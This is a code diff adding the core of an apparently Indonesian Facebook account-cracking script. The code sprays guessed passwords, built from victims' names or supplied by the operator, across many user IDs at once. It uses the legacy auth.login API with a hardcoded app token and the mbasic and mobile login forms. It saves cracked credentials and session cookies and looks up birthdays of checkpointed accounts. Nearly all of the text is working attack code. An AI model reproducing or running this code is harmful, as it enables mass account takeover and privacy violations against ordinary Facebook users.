@@ -535,3 +535,246 @@ def laporbug():
     raw_input('\n \x1b[1;92m[*] \x1b[1;93mkembali ')
     menu()
 
+def sandimanual():
+	print("\n \x1b[1;92m[\x1b[1;93m!\x1b[1;92m] \x1b[1;93mgunakan , (koma) \x1b[1;93muntuk pemisah contoh \x1b[1;97m: \x1b[1;93msandi123\x1b[1;97m,sandi12345,\x1b[1;93mdll\x1b[1;97m. \x1b[1;93msetiap kata minimal 6 karakter atau lebih")
+	pwek=raw_input('\n \x1b[1;92m[\x1b[1;93m?\x1b[1;92m] \x1b[1;93mmasukan kata sandi \x1b[1;93m: \x1b[1;92m')
+	print(' \x1b[1;92m[\x1b[1;93m+\x1b[1;92m] \x1b[1;93mcrack dengan sandi -> \x1b[1;92m[ \x1b[1;93m%s%s%s \x1b[1;92m]' % (M, pwek, N))
+	if pwek=="":
+		exit(" %s\x1b[1;92m[\x1b[1;93m!\x1b[1;92m] \x1b[1;93misi jawaban dengan benar\x1b[1;97m!"%(M))
+	elif len(pwek)<=5:
+		exit(" %s\x1b[1;92m[\x1b[1;93m!\x1b[1;92m] \x1b[1;93mmasukan sandi minimal 6 angka\x1b[1;97m!"%(M))
+	print("\n \x1b[1;92m[ \x1b[1;93mpilih method version - silahkan coba satu² \x1b[1;92m]\n")
+	print(" \x1b[1;92m[\x1b[1;93m1\x1b[1;92m]. \x1b[1;93mmethod API \x1b[1;92m(\x1b[1;93mfast\x1b[1;92m)")
+	print(" \x1b[1;92m[\x1b[1;93m2\x1b[1;92m]. \x1b[1;93mmethod mbasic \x1b[1;92m(\x1b[1;93mslow\x1b[1;92m)")
+	print(" \x1b[1;92m[\x1b[1;93m3\x1b[1;92m]. \x1b[1;93mmethod mobile \x1b[1;92m(\x1b[1;93msuper slow\x1b[1;92m)")
+	ask=raw_input("\n \x1b[1;92m[\x1b[1;93m?\x1b[1;92m] \x1b[1;93mmethod \x1b[1;97m: \x1b[1;92m")
+	if ask=="":
+		exit(" %s\x1b[1;92m[\x1b[1;93m!\x1b[1;92m] \x1b[1;93misi jawaban dengan benar\x1b[1;97m!"%(M))
+	elif ask=="1":
+		print('\n \x1b[1;92m[+] hasil OK disimpan ke > OK/%s.txt' % (tanggal))
+		print(' \x1b[1;93m[+] hasil CP disimpan ke > CP/%s.txt' % (tanggal))
+		print('\n \x1b[1;92m[\x1b[1;93m!\x1b[1;92m] \x1b[1;93manda bisa mematikan data selular untuk menjeda proses crack\n')
+		with ThreadPoolExecutor(max_workers=30) as fall:
+			for user in id:
+				uid, name = user.split("<=>")
+				fall.submit(api, uid, pwek.split(","))
+		exit("\n\n \x1b[1;92m[\x1b[1;93m#\x1b[1;92m] \x1b[1;93mcrack selesai...\x1b[1;97m")
+	elif ask=="2":
+		print('\n \x1b[1;92m[+] hasil OK disimpan ke > OK/%s.txt' % (tanggal))
+		print(' \x1b[1;93m[+] hasil CP disimpan ke > CP/%s.txt' % (tanggal))
+		print('\n \x1b[1;92m[\x1b[1;93m!\x1b[1;92m] \x1b[1;93manda bisa mematikan data selular untuk menjeda proses crack\n')
+		with ThreadPoolExecutor(max_workers=30) as fall:
+			for user in id:
+				uid, name = user.split("<=>")
+				fall.submit(mfbasic, uid, pwek.split(","),"https://mbasic.facebook.com")
+		exit("\n\n \x1b[1;92m[\x1b[1;93m#\x1b[1;92m] \x1b[1;93mcrack selesai...\x1b[1;97m")
+	elif ask=="3":
+		print('\n \x1b[1;92m[+] hasil OK disimpan ke > OK/%s.txt' % (tanggal))
+		print(' \x1b[1;93m[+] hasil CP disimpan ke > CP/%s.txt' % (tanggal))
+		print('\n \x1b[1;92m[\x1b[1;93m!\x1b[1;92m] \x1b[1;93manda bisa mematikan data selular untuk menjeda proses crack\n')
+		with ThreadPoolExecutor(max_workers=30) as fall:
+			for user in id:
+				uid, name = user.split("<=>")
+				fall.submit(mfbasic, uid, pwek.split(","),"https://m.facebook.com")
+		exit("\n\n \x1b[1;92m[\x1b[1;93m#\x1b[1;92m] \x1b[1;93mcrack selesai...\x1b[1;97m")
+	
+def sandiotomatis():
+	print("\n \x1b[1;92m[ \x1b[1;93mpilih method version - silahkan coba satu² \x1b[1;92m]\n")
+	print(" \x1b[1;92m[\x1b[1;93m1\x1b[1;92m]. \x1b[1;93mmethod API \x1b[1;92m(\x1b[1;93mfast\x1b[1;92m)")
+	print(" \x1b[1;92m[\x1b[1;93m2\x1b[1;92m]. \x1b[1;93mmethod mbasic \x1b[1;92m(\x1b[1;93mslow\x1b[1;92m)")
+	print(" \x1b[1;92m[\x1b[1;93m3\x1b[1;92m]. \x1b[1;93mmethod mobile \x1b[1;92m(\x1b[1;93msuper slow\x1b[1;92m)")
+	ask=raw_input("\n \x1b[1;92m[\x1b[1;93m?\x1b[1;92m] \x1b[1;93mmethod \x1b[1;97m: \x1b[1;92m")
+	if ask=="":
+		exit(" %s\x1b[1;92m[\x1b[1;93m!\x1b[1;92m] \x1b[1;93misi jawaban dengan benar\x1b[1;97m!"%(M))
+	elif ask=="1":
+		print('\n \x1b[1;92m[+] hasil OK disimpan ke > OK/%s.txt' % (tanggal))
+		print(' \x1b[1;93m[+] hasil CP disimpan ke > CP/%s.txt' % (tanggal))
+		print('\n \x1b[1;92m[\x1b[1;93m!\x1b[1;92m] \x1b[1;93manda bisa mematikan data selular untuk menjeda proses crack\n')
+		with ThreadPoolExecutor(max_workers=30) as fall:
+			for user in id:
+				uid, name = user.split("<=>")
+				nam = name.split(' ')
+				if len(name) == 3 or len(name) == 4 or len(name) == 5:
+					pwx = [name, nam[0]+"123", nam[0]+"12345"]
+				else:
+					pwx = [name, nam[0]+"123", nam[0]+"12345"]
+				fall.submit(api, uid, pwx)
+		exit("\n\n \x1b[1;92m[\x1b[1;93m#\x1b[1;92m] \x1b[1;93mcrack selesai...\x1b[1;97m")
+	elif ask=="2":
+		print('\n \x1b[1;92m[+] hasil OK disimpan ke > OK/%s.txt' % (tanggal))
+		print(' \x1b[1;93m[+] hasil CP disimpan ke > CP/%s.txt' % (tanggal))
+		print('\n \x1b[1;92m[\x1b[1;93m!\x1b[1;92m] \x1b[1;93manda bisa mematikan data selular untuk menjeda proses crack\n')
+		with ThreadPoolExecutor(max_workers=30) as fall:
+			for user in id:
+				uid, name = user.split("<=>")
+				nam = name.split(' ')
+				if len(name) == 3 or len(name) == 4 or len(name) == 5:
+					pwx = [name, nam[0]+"123", nam[0]+"12345"]
+				else:
+					pwx = [name, nam[0]+"123", nam[0]+"12345"]
+				fall.submit(mfbasic, uid, pwx,"https://mbasic.facebook.com")
+		exit("\n\n \x1b[1;92m[\x1b[1;93m#\x1b[1;92m] \x1b[1;93mcrack selesai...\x1b[1;97m")
+	elif ask=="3":
+		print('\n \x1b[1;92m[+] hasil OK disimpan ke > OK/%s.txt' % (tanggal))
+		print(' \x1b[1;93m[+] hasil CP disimpan ke > CP/%s.txt' % (tanggal))
+		print('\n \x1b[1;92m[\x1b[1;93m!\x1b[1;92m] \x1b[1;93manda bisa mematikan data selular untuk menjeda proses crack\n')
+		with ThreadPoolExecutor(max_workers=30) as fall:
+			for user in id:
+				uid, name = user.split("<=>")
+				nam = name.split(' ')
+				if len(name) == 3 or len(name) == 4 or len(name) == 5:
+					pwx = [name, nam[0]+"123", nam[0]+"12345"]
+				else:
+					pwx = [name, nam[0]+"123", nam[0]+"12345"]
+				fall.submit(mfbasic, uid, pwx,"https://m.facebook.com")
+		exit("\n\n \x1b[1;92m[\x1b[1;93m#\x1b[1;92m] \x1b[1;93mcrack selesai...\x1b[1;97m")
+		
+### BAGIAN CRACK ###
+def api(uid, pwx):
+	global ok, cp, loop, token
+	sys.stdout.write(
+		"\r %s\x1b[1;92m[\x1b[1;93m+\x1b[1;92m] \x1b[1;92m[\x1b[1;93mcrack\x1b[1;92m] %s/%s \x1b[1;92mOK:-%s - \x1b[1;93mCP:-%s "%(N,loop, len(id), len(ok), len(cp))
+	); sys.stdout.flush()
+	for pw in pwx:
+		pw = pw.lower()
+		ua = random.choice([
+			'Mozilla/5.0 (Linux; U; Android 4.1.2; de-de; GT-I8190 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30',
+			'Mozilla/5.0 (Linux; Android 5.1; A1601 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36',
+			'Mozilla/5.0 (Linux; Android 6.0; MYA-L22 Build/HUAWEIMYA-L22) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36',
+			'Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-G610M Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/7.4 Chrome/59.0.3071.125 Mobile Safari/537.36',
+			'Mozilla/5.0 (Linux; Android 7.1; vivo 1716 Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.98 Mobile Safari/537.36',
+			'Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-G950U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.2 Chrome/71.0.3578.99 Mobile Safari/537.36',
+			'Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.1 Chrome/71.0.3578.99 Mobile Safari/537.36'
+		])
+		headers = ({
+			'Authorization': 'OAuth 350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',
+			'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)),
+			'x-fb-sim-hni': str(random.randint(20000, 40000)),
+			'x-fb-net-hni': str(random.randint(20000, 40000)),
+			'x-fb-connection-quality': 'EXCELLENT',
+			'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
+			'content-type': 'application/x-www-form-urlencoded',
+			'user-agent': ua,
+			'x-fb-http-engine': 'Liger'
+		})
+		params = {
+			'format': 'JSON',
+			'sdk_version': '2',
+			'email': str(uid),
+			'locale': 'en_US',
+			'password': str(pw),
+			'sdk': 'ios',
+			'generate_session_cookies': '1',
+			'sig': '3f555f99fb61fcd7aa0c44f58f522ef6',
+		}
+		status_masuk = requests.get("https://b-api.facebook.com/method/auth.login",headers=headers,params=params) 
+		file_jason = json.loads(status_masuk.text)
+		if "Calls to this api have exceeded the rate limit. (613)" in file_jason:
+			t=15
+			while t:
+				mins, secs = divmod(t, 60)
+				sys.stdout.write("\r %s[!] aktifkan mode pesawat selama 5 detik%s"%(M,N))
+				sys.stdout.flush()
+				sleep(1.5)
+				t -= 1
+		elif "session_key" in status_masuk.text and "EAAA" in status_masuk.text:
+			print("\r  %s* --> %s|%s|%s"%(H,uid, pw, send.json()["access_token"]))
+			ok.append("%s|%s"%(uid, pw))
+			open("OK/%s.txt"%(tanggal),"a").write("  * --> %s|%s\n"%(uid, pw))
+			break
+		elif "User must verify their account on www.facebook.com (405)" in status_masuk.text:
+			try:
+				token=open("token.txt","r").read()
+				ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
+				month, day, year = ttl.split("/")
+				month = bulan[month]
+				print("\r  %s* --> %s|%s|%s %s %s"%(K,uid, pw, day, month, year))
+				cp.append("%s|%s"%(uid, pw))
+				open("CP/%s.txt"%(tanggal),"a").write("  * --> %s|%s|%s %s %s\n"%(uid, pw, day, month, year))
+				break
+			except (KeyError, IOError):
+				day = (" ")
+				month = (" ")
+				year = (" ")
+			except:pass
+			print("\r  %s* --> %s|%s         "%(K,uid, pw))
+			cp.append("%s|%s"%(uid, pw))
+			open("CP/%s.txt"%(tanggal),"a").write("  * --> %s|%s\n"%(uid, pw))
+			break
+		else:
+			continue
+
+	loop += 1
+	
+def mfbasic(uid, pwx,url,**data):
+	global ok, cp, loop, token
+	sys.stdout.write(
+		"\r %s\x1b[1;92m[\x1b[1;93m+\x1b[1;92m] \x1b[1;92m[\x1b[1;93mcrack\x1b[1;92m] %s/%s \x1b[1;92mOK:-%s - \x1b[1;93mCP:-%s "%(N,loop, len(id), len(ok), len(cp))
+	); sys.stdout.flush()
+	for pw in pwx:
+		pw = pw.lower()
+		ua = random.choice([
+			'Mozilla/5.0 (Linux; U; Android 4.1.2; de-de; GT-I8190 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30',
+			'Mozilla/5.0 (Linux; Android 5.1; A1601 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36',
+			'Mozilla/5.0 (Linux; Android 6.0; MYA-L22 Build/HUAWEIMYA-L22) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36',
+			'Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-G610M Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/7.4 Chrome/59.0.3071.125 Mobile Safari/537.36',
+			'Mozilla/5.0 (Linux; Android 7.1; vivo 1716 Build/N2G47H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.98 Mobile Safari/537.36',
+			'Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-G950U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.2 Chrome/71.0.3578.99 Mobile Safari/537.36',
+			'Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.1 Chrome/71.0.3578.99 Mobile Safari/537.36'
+		])
+		ge=s.get(url+"/login/?next&ref=dbl&refid=8").text
+		sop=parser(ge,"html.parser")
+		for i in sop.find_all("raw_input"):
+			if i.get("name")==None or "_fb_noscript" in i.get("name") or "sign_up" in i.get("name"):continue
+			else:data.update({i.get("name"):i.get("value")})
+		data.update({"email":uid,"pass":pw})
+		log_in=url+sop.find("form",method="post").get("action")
+		if "m.facebook.com" in url:
+			s.headers.update({"Host":re.findall("//(.+)",url)[0],"x-fb-lsd":data.get("lsd"),"content-type":"application/x-www-form-urlencoded","accept":"*/*","user-agent":ua,"referer":url+"/login/?next&ref=dbl&fl&refid=8","origin":url,"accept-encoding":"gzip, deflate","accept-language":"id-ID,en-US;q=0.9"})
+		else:
+			if "mbasic.facebook.com" in url:
+				hea="text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"
+			else:
+				hea="text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"
+		s.headers.update({"Host":re.findall("//(.+)",url)[0],"sec-fetch-user":"?1","upgrade-insecure-requests":"1","content-type":"application/x-www-form-urlencoded","cache-control":"max-age=0","accept":hea,"origin":url,"user-agent":ua,"referer":url+"/login/?next&ref=dbl&fl&refid=8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
+		po=s.post(log_in,data=data)
+		if "c_user" in s.cookies.get_dict().keys():
+			kukis = ";".join([e+"="+v for e,v in s.cookies.get_dict().items()])
+			print("\r  %s* --> %s|%s|%s"%(H,uid, pw, kukis))
+			ok.append("%s|%s"%(uid, pw))
+			open("OK/%s.txt"%(tanggal),"a").write("  * --> %s|%s\n"%(uid, pw))
+			break
+		elif "checkpoint" in s.cookies.get_dict().keys():
+			try:
+				token=open("token.txt","r").read()
+				ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
+				month, day, year = ttl.split("/")
+				month = bulan[month]
+				print("\r  %s* --> %s|%s|%s %s %s"%(K,uid, pw, day, month, year))
+				cp.append("%s|%s"%(uid, pw))
+				open("CP/%s.txt"%(tanggal),"a").write("  * --> %s|%s|%s %s %s\n"%(uid, pw, day, month, year))
+				break
+			except (KeyError, IOError):
+				day = (" ")
+				month = (" ")
+				year = (" ")
+			except:pass
+			print("\r  %s* --> %s|%s         "%(K,uid, pw))
+			cp.append("%s|%s"%(uid, pw))
+			open("CP/%s.txt"%(tanggal),"a").write("  * --> %s|%s\n"%(uid, pw))
+			break
+		else:
+			continue
+
+	loop += 1
+
+def buatfolder():
+	try:os.mkdir("CP")
+	except:pass
+	try:os.mkdir("OK")
+	except:pass
+
+if __name__ == '__main__':
+	os.system("git pull")
+	buatfolder()
+	menu()
